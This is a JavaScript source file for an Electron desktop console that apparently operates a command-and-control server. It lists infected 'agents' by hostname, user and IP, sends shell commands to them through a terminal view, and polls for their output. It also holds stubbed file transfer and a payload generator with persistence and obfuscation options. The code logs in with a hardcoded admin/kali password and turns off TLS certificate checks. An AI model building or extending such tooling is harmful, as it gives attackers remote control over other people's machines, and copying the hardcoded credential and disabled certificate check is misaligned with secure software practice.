const { ipcRenderer } = require('electron');
const axios = require('axios');
const { Terminal } = require('xterm');
const { FitAddon } = require('xterm-addon-fit');

//============================================================================
// Global State
//============================================================================

let c2ServerURL = '';
let authToken = '';
let connected = false;
let selectedAgentId = '';
let pollingInterval = null;
let agents = [];

//============================================================================
// Initialize
//============================================================================

document.addEventListener('DOMContentLoaded', () => {
    initializeEventListeners();
    initializeTerminal();
    loadSettings();
    logActivity('Application started');
});

//============================================================================
// Event Listeners
//============================================================================

function initializeEventListeners() {
    // Navigation
    document.querySelectorAll('.nav-item').forEach(item => {
        item.addEventListener('click', () => {
            const view = item.dataset.view;
            switchView(view);

            // Update active nav item
            document.querySelectorAll('.nav-item').forEach(nav => nav.classList.remove('active'));
            item.classList.add('active');
        });
    });

    // Connect button
    document.getElementById('connectBtn').addEventListener('click', connectToC2);

    // Refresh agents
    document.getElementById('refreshAgentsBtn').addEventListener('click', loadAgents);

    // Agent selection in terminal
    document.getElementById('agentSelect').addEventListener('change', (e) => {
        selectedAgentId = e.target.value;
        if (selectedAgentId && term) {
            term.clear();
            const agent = agents.find(a => a.agent_id === selectedAgentId);
            if (agent) {
                term.writeln(`[*] Connected to ${agent.hostname} (${agent.platform})`);
                term.writeln('');
                term.write('$ ');
            }
        }
    });
    document.getElementById('clearTerminal').addEventListener('click', () => {
        term.clear();
    });

    // File Transfer
    document.getElementById('browseFileBtn').addEventListener('click', async () => {
        const file = await ipcRenderer.invoke('select-file');
        if (file) document.getElementById('localFilePath').value = file;
    });

    document.getElementById('browseSaveBtn').addEventListener('click', async () => {
        const dir = await ipcRenderer.invoke('select-directory');
        if (dir) document.getElementById('localSavePath').value = dir;
    });

    document.getElementById('uploadBtn').addEventListener('click', uploadFile);
    document.getElementById('downloadBtn').addEventListener('click', downloadFile);

    // Tools
    document.getElementById('sslGenBtn').addEventListener('click', () => runTool('ssl_gen'));
    document.getElementById('apkSignerBtn').addEventListener('click', () => runTool('apk_signer'));
    document.getElementById('buildAgentBtn').addEventListener('click', () => runTool('build_agent'));

    // Settings
    document.getElementById('saveSettingsBtn').addEventListener('click', saveSettings);
}

//============================================================================
// View Management
//============================================================================

function switchView(viewName) {
    // Hide all views
    document.querySelectorAll('.view').forEach(view => view.classList.remove('active'));
    document.querySelectorAll('.content-section').forEach(section => section.style.display = 'none');

    // Show selected view
    const viewElement = document.getElementById(`${viewName}View`);
    const sectionElement = document.getElementById(`${viewName}-section`);

    if (viewElement) {
        viewElement.classList.add('active');
    }
    if (sectionElement) {
        sectionElement.style.display = 'block';
    }

    // Update header title
    const titles = {
        'dashboard': 'Dashboard',
        'agents': 'Agents',
        'terminal': 'Terminal',
        'files': 'File Transfer',
        'payload': 'Payload Generator',
        'tools': 'Tools',
        'settings': 'Settings'
    };

    document.getElementById('viewTitle').textContent = titles[viewName] || viewName;

    // Load data if needed
    if (viewName === 'agents' && connected) {
        loadAgents();
    }
}

//============================================================================
// C2 Connection
//============================================================================

async function connectToC2() {
    const serverInput = document.getElementById('c2ServerInput').value.trim();
    if (!serverInput) {
        showNotification('Error', 'Please enter C2 server address');
        return;
    }

    c2ServerURL = serverInput;

    // Save C2 server address to localStorage
    localStorage.setItem('c2Server', c2ServerURL);

    logActivity(`Connecting to ${c2ServerURL}...`);

    try {
        // Create HTTPS agent that accepts self-signed certificates
        const https = require('https');
        const httpsAgent = new https.Agent({
            rejectUnauthorized: false // Accept self-signed certificates
        });

        // Test health endpoint first
        const healthResponse = await axios.get(`${c2ServerURL}/health`, {
            timeout: 5000,
            httpsAgent: httpsAgent
        });

        if (healthResponse.data.status === 'healthy') {
            logActivity('Server is healthy, authenticating...');

            // Login to get JWT token
            // Using default credentials: admin / <ADMIN_PASSWORD from env>
            const loginResponse = await axios.post(`${c2ServerURL}/api/auth/login`, {
                username: 'admin',
                password: 'kali'  // This should match the C2 server's ADMIN_PASSWORD env var
            }, {
                httpsAgent: httpsAgent
            });

            if (loginResponse.data.token) {
                authToken = loginResponse.data.token;
                connected = true;
                updateConnectionStatus(true);
                logActivity('Connected to C2 server');
                showNotification('Success', 'Connected to C2 server');
                startPolling();
            } else {
                throw new Error('No token received from server');
            }
        }
    } catch (error) {
        logActivity(`Connection failed: ${error.message}`, 'error');
        showNotification('Connection Error', error.message);
        updateConnectionStatus(false);
    }
}

function updateConnectionStatus(isConnected) {
    const statusIndicator = document.getElementById('connectionStatus');
    const statusText = document.getElementById('connectionText');

    if (isConnected) {
        statusIndicator.className = 'status-indicator connected';
        statusText.textContent = 'Connected';
    } else {
        statusIndicator.className = 'status-indicator disconnected';
        statusText.textContent = 'Disconnected';
    }
}

function startPolling() {
    if (pollingInterval) {
        clearInterval(pollingInterval);
    }

    const interval = parseInt(document.getElementById('pollingInterval')?.value || 5);
    pollingInterval = setInterval(() => {
        if (connected) {
            loadAgents();
        }
    }, interval * 1000);
}

//============================================================================
// Agents Management
//============================================================================

async function loadAgents() {
    if (!connected) {
        showNotification('Error', 'Not connected to C2 server');
        return;
    }

    try {
        const https = require('https');
        const httpsAgent = new https.Agent({
            rejectUnauthorized: false
        });

        const response = await axios.get(`${c2ServerURL}/api/agents`, {
            headers: {
                'Authorization': `Bearer ${authToken}`
            },
            httpsAgent: httpsAgent
        });

        agents = response.data.agents || [];
        renderAgentsTable();
        updateAgentSelectors();

        // Update dashboard stats (only count online agents)
        const onlineAgents = agents.filter(isAgentOnline).length;
        document.getElementById('activeAgentsCount').textContent = onlineAgents;

    } catch (error) {
        logActivity(`Failed to load agents: ${error.message}`, 'error');
    }
}

function isAgentOnline(agent) {
    if (!agent.last_seen) return false;
    const lastSeen = new Date(agent.last_seen);
    const now = new Date();
    const diffSeconds = (now - lastSeen) / 1000;
    return diffSeconds < 30; // Online if seen within last 30 seconds
}

function renderAgentsTable() {
    const tbody = document.getElementById('agentsTableBody');

    if (agents.length === 0) {
        tbody.innerHTML = '<tr><td colspan="7" class="no-data">No agents connected. Waiting for checkins...</td></tr>';
        return;
    }

    tbody.innerHTML = agents.map(agent => {
        const online = isAgentOnline(agent);
        const statusBadge = online
            ? '<span class="status-badge online">🟢 Online</span>'
            : '<span class="status-badge offline">🔴 Offline</span>';

        return `
        <tr>
            <td><code>${agent.agent_id.substring(0, 8)}</code></td>
            <td>${agent.hostname || 'N/A'}</td>
            <td>${agent.username || 'N/A'}</td>
            <td>${agent.platform || 'N/A'}</td>
            <td>${agent.ip_address || 'N/A'}</td>
            <td>${statusBadge} ${formatTime(agent.last_seen)}</td>
            <td>
                <button class="btn btn-sm" onclick="selectAgent('${agent.agent_id}')">Terminal</button>
            </td>
        </tr>
    `;
    }).join('');
}

function updateAgentSelectors() {
    const selects = ['agentSelect', 'uploadAgentSelect', 'downloadAgentSelect'];

    selects.forEach(selectId => {
        const select = document.getElementById(selectId);
        if (!select) return;

        select.innerHTML = '<option value="">Select an agent...</option>' +
            agents.map(agent =>
                `<option value="${agent.agent_id}">${agent.hostname} (${agent.platform})</option>`
            ).join('');
    });
}

function selectAgent(agentId) {
    selectedAgentId = agentId;
    switchView('terminal');
    document.getElementById('agentSelect').value = agentId;
    const agent = agents.find(a => a.agent_id === agentId);
    if (agent) {
        term.writeln(`\r\n[*] Connected to ${agent.hostname} (${agent.platform})`);
    }
}

async function sendCommand(agentId, command) {
    if (!command) {
        command = prompt('Enter command:');
        if (!command) return;
    }

    try {
        const https = require('https');
        const httpsAgent = new https.Agent({
            rejectUnauthorized: false
        });

        const response = await axios.post(
            `${c2ServerURL} /api/agents / ${agentId}/command`,
            { command },
            {
                headers: { 'Authorization': `Bearer ${authToken}` },
                httpsAgent: httpsAgent
            }
        );

        logActivity(`Command sent to agent: ${command}`);
        showNotification('Success', 'Command queued for execution');
    } catch (error) {
        logActivity(`Failed to send command: ${error.message}`, 'error');
    }
}

//============================================================================
// Terminal
//============================================================================

let term;
let commandInProgress = false;
let lastResultId = 0;
let resultPollInterval = null;

function initializeTerminal() {
    term = new Terminal({
        cursorBlink: true,
        theme: {
            background: '#1a1a2e',
            foreground: '#00ff9f',
            cursor: '#00ff9f',
            selection: 'rgba(0, 255, 159, 0.3)'
        },
        fontSize: 14,
        fontFamily: 'Consolas, "Courier New", monospace'
    });

    const fitAddon = new FitAddon();
    term.loadAddon(fitAddon);

    term.open(document.getElementById('terminal'));
    fitAddon.fit();

    term.writeln('RAMP Terminal v1.0.0');
    term.writeln('Select an agent to start...\r\n');

    // Handle input
    let currentLine = '';
    term.onData(data => {
        if (!selectedAgentId) {
            term.write('\r\nNo agent selected\r\n$ ');
            return;
        }

        // Block input if command is in progress
        if (commandInProgress) {
            return; // Ignore input while waiting for output
        }

        if (data === '\r') {
            term.write('\r\n');
            if (currentLine.trim()) {
                commandInProgress = true;
                sendTerminalCommand(selectedAgentId, currentLine.trim());
                term.write('Waiting for response...\r\n');
            } else {
                term.write('$ ');
            }
            currentLine = '';
        } else if (data === '\u007F') {
            if (currentLine.length > 0) {
                currentLine = currentLine.slice(0, -1);
                term.write('\b \b');
            }
        } else {
            currentLine += data;
            term.write(data);
        }
    });

    window.addEventListener('resize', () => fitAddon.fit());

    // Start fast polling for results (500ms)
    startResultPolling();
}

function startResultPolling() {
    if (resultPollInterval) {
        clearInterval(resultPollInterval);
    }
    resultPollInterval = setInterval(pollResults, 500); // Fast polling every 500ms
}

function stopResultPolling() {
    if (resultPollInterval) {
        clearInterval(resultPollInterval);
        resultPollInterval = null;
    }
}

async function pollResults() {
    if (!connected || !selectedAgentId) return;

    try {
        const https = require('https');
        const httpsAgent = new https.Agent({
            rejectUnauthorized: false
        });

        const response = await axios.get(
            `${c2ServerURL}/api/agents/${selectedAgentId}/results`,
            {
                headers: { 'Authorization': `Bearer ${authToken}` },
                httpsAgent: httpsAgent,
                timeout: 2000
            }
        );

        const results = response.data.results || [];

        // Display new results
        for (const result of results.reverse()) {
            if (result.id > lastResultId) {
                if (result.output || result.error) {
                    // Clear "Waiting for response..." message if present
                    if (commandInProgress) {
                        commandInProgress = false;
                    }

                    if (result.output) {
                        term.write(result.output.replace(/\n/g, '\r\n'));
                        if (!result.output.endsWith('\n')) {
                            term.write('\r\n');
                        }
                    }
                    if (result.error) {
                        term.write(`\x1b[31mError: ${result.error}\x1b[0m\r\n`); // Red error
                    }

                    // Show prompt for new command
                    term.write('$ ');
                }
                lastResultId = result.id;
            }
        }
    } catch (error) {
        // Silently fail - don't spam errors
    }
}

async function sendTerminalCommand(agentId, command) {
    try {
        const https = require('https');
        const httpsAgent = new https.Agent({
            rejectUnauthorized: false
        });

        await axios.post(
            `${c2ServerURL}/api/agents/${agentId}/command`,
            { command },
            {
                headers: { 'Authorization': `Bearer ${authToken}` },
                httpsAgent: httpsAgent
            }
        );

        logActivity(`Command sent: ${command}`);
    } catch (error) {
        term.write(`\r\n\x1b[31mFailed to send command: ${error.message}\x1b[0m\r\n`);
        logActivity(`Command error: ${error.message}`, 'error');
        commandInProgress = false;
        term.write('$ ');
    }
}

//============================================================================
// File Transfer
//============================================================================

async function uploadFile() {
    const agentId = document.getElementById('uploadAgentSelect').value;
    const localPath = document.getElementById('localFilePath').value;
    const remotePath = document.getElementById('remoteFilePath').value;

    if (!agentId || !localPath || !remotePath) {
        showNotification('Error', 'Please fill all fields');
        return;
    }

    // TODO: Implement actual file upload
    logActivity(`File upload queued: ${localPath} -> ${remotePath}`);
    showNotification('Success', 'File upload queued');
}

async function downloadFile() {
    const agentId = document.getElementById('downloadAgentSelect').value;
    const remotePath = document.getElementById('remoteDownloadPath').value;
    const localPath = document.getElementById('localSavePath').value;

    if (!agentId || !remotePath || !localPath) {
        showNotification('Error', 'Please fill all fields');
        return;
    }

    // TODO: Implement actual file download
    logActivity(`File download queued: ${remotePath} -> ${localPath}`);
    showNotification('Success', 'File download queued');
}

//============================================================================
// Payload Generator
//============================================================================

async function generatePayload() {
    const config = {
        c2Server: document.getElementById('payloadC2Server').value,
        platform: document.getElementById('payloadPlatform').value,
        arch: document.getElementById('payloadArch').value,
        persistence: document.getElementById('enablePersistence').checked,
        obfuscate: document.getElementById('obfuscate').checked,
        certPin: document.getElementById('certPin').value
    };

    logActivity(`Generating payload: ${config.platform}/${config.arch}`);

    // TODO: Implement payload generation
    showNotification('Payload Generator', 'Payload generation not yet implemented');
}

//============================================================================
// Tools
//============================================================================

function runTool(toolName) {
    logActivity(`Running tool: ${toolName}`);
    showNotification('Tools', `${toolName} tool integration coming soon`);
}

//============================================================================
// Settings
//============================================================================

function saveSettings() {
    const settings = {
        defaultC2Server: document.getElementById('defaultC2Server').value,
        pollingInterval: document.getElementById('pollingInterval').value,
        autoReconnect: document.getElementById('autoReconnect').checked
    };

    localStorage.setItem('rampSettings', JSON.stringify(settings));
    localStorage.setItem('c2Server', document.getElementById('c2ServerInput').value); // Save current C2 server
    logActivity('Settings saved');
    showNotification('Success', 'Settings saved successfully');
}

function loadSettings() {
    const saved = localStorage.getItem('rampSettings');
    if (saved) {
        const settings = JSON.parse(saved);
        if (settings.defaultC2Server) {
            document.getElementById('c2ServerInput').value = settings.defaultC2Server;
            document.getElementById('defaultC2Server').value = settings.defaultC2Server;
        }
        if (settings.pollingInterval) {
            document.getElementById('pollingInterval').value = settings.pollingInterval;
        }
        if (settings.autoReconnect !== undefined) {
            document.getElementById('autoReconnect').checked = settings.autoReconnect;
        }
    }
}

//============================================================================
// UI Utilities
//============================================================================

function updateStats() {
    document.getElementById('activeAgentsCount').textContent = agents.filter(a => a.status === 'active').length;
    document.getElementById('totalSessionsCount').textContent = agents.length;
}

function logActivity(message, type = 'info') {
    const log = document.getElementById('activityLog');
    if (!log) return;

    const entry = document.createElement('div');
    entry.className = `activity-entry ${type}`;
    entry.innerHTML = `
        <span class="timestamp">${new Date().toLocaleTimeString()}</span>
        <span class="message">${message}</span>
    `;

    log.insertBefore(entry, log.firstChild);

    // Keep only last 50 entries
    while (log.children.length > 50) {
        log.removeChild(log.lastChild);
    }
}

function showNotification(title, body) {
    ipcRenderer.send('show-notification', { title, body });
}

function formatTime(isoString) {
    if (!isoString) return 'Never';
    const date = new Date(isoString);
    const now = new Date();
    const diff = Math.floor((now - date) / 1000);

    if (diff < 60) return `${diff}s ago`;
    if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
    if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
    return date.toLocaleString();
}
